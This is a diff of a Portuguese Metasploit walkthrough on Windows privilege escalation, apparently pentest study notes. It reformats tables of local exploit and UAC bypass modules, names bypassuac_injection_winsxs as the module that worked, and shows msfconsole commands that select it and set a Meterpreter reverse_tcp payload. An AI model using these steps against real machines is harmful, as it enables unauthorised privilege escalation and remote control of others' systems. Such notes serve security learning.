@@ -68,10 +68,11 @@ E procurar por exploits que escale privilégios. Exemplos:
   msf6 exploit(multi/handler) > search 2022
   ``` 
   Alguns exploits candidatos:
-  | # | Name | Rank | Check | Description |
-  |---|------|------|-------|-------------|
-  | 47 |  exploit/windows/local/cve_2022_21999_spoolfool_privesc 2022-02-08 | normal |   Yes |   CVE-2022-21999 SpoolFool Privesc |
-  |233 | exploit/windows/local/cve_2022_26904_superprofile 2022-03-17 | excellent |      Yes | User Profile Arbitrary Junction Creation Local Privilege Elevation |
+  
+  | # | Name | Date | Rank | Check | Description |
+  |---|------|------|------|-------|-------------|
+  | 47 |  exploit/windows/local/cve_2022_21999_spoolfool_privesc | 2022-02-08 | normal |   Yes |   CVE-2022-21999 SpoolFool Privesc |
+  |233 | exploit/windows/local/cve_2022_26904_superprofile | 2022-03-17 | excellent |      Yes | User Profile Arbitrary Junction Creation Local Privilege Elevation |
 
   *observe 'windows/local'*
 * Procure por 'bypassuac'.
@@ -79,36 +80,33 @@ E procurar por exploits que escale privilégios. Exemplos:
   msf6 exploit(multi/handler) > search bypassuac
   ```
   Alguns exploits candidatos:
-  | # | Name | Rank | Check | Description |
-  |---|------|------|-------|-------------|
-  | 2 | exploit/windows/local/bypassuac 2010-12-31 |excellent | No | Windows Escalate UAC Protection Bypass|
-  |5   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
-  |8   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
-  | 11  exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
-   12  exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
-   13  exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
-   14    \_ target: Windows x86                               .                .          .      .
-   15    \_ target: Windows x64                               .                .          .      .
-   16  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
-   17  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
-   18  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
-   19  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
-   20    \_ target: Windows x86                               .                .          .      .
-   21    \_ target: Windows x64
-   22  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
+  | # | Name | Date | Rank | Check | Description |
+  |---|------|------|------|-------|-------------|
+  | 2 | exploit/windows/local/bypassuac | 2010-12-31 |excellent | No | Windows Escalate UAC Protection Bypass|
+  |5 |  exploit/windows/local/bypassuac_injection | 2010-12-31  |     excellent | No |    Windows Escalate UAC Protection Bypass (In Memory Injection)|
+  |8 |  exploit/windows/local/bypassuac_injection_winsxs  |     2017-04-06   |    excellent | No    | Windows Escalate UAC Protection Bypass (In Memory Injection)|
+  | 11 | exploit/windows/local/bypassuac_vbs    |                2015-08-22    |   excellent | No    | Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)|
+  | 12 | exploit/windows/local/bypassuac_comhijack     |         1900-01-01      | excellent  |Yes   | Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)|
+  | 13 | exploit/windows/local/bypassuac_eventvwr     |          2016-08-15    |  excellent | Yes  |  Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)|
+  | 16 | exploit/windows/local/bypassuac_sdclt    |              2017-03-17       |excellent | Yes  |  Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)|
+  | 17 | exploit/windows/local/bypassuac_silentcleanup     |     2019-02-24     |  excellent | No   |  Windows Escalate UAC Protection Bypass (Via SilentCleanup) |
+  | 18 | exploit/windows/local/bypassuac_dotnet_profiler  |      2017-03-17   |    excellent |Yes  |  Windows Escalate UAC Protection Bypass (Via dot net profiler)|
+  | 19 | exploit/windows/local/bypassuac_fodhelper      |        2017-05-12   |    excellent | Yes  |  Windows UAC Protection Bypass (Via FodHelper Registry Key)|
+  | 22 | exploit/windows/local/bypassuac_sluihijack      |       2018-01-15     |  excellent | Yes  |  Windows UAC Protection Bypass (Via Slui File Handler Hijack)|
 
 ## Seleção do Exploit
 
 Após vária tentativas, o exploit que funcionou foi o **bypassuac_injection_winsxs**
+
+> Description:
+>  This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off by abusing the way "WinSxS" works in Windows systems. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three seperate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also).
 ```
 msf6 > use exploit/windows/local/bypassuac_injection_winsxs
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 ```
-> Description:
-> Description:
->  This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off by abusing the way "WinSxS" works in Windows systems. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three seperate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also).
+## Configuração
 
-Configurando a arquitetura.
+Informando payload e target para a arquitetura do alvo.
 ```
 set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
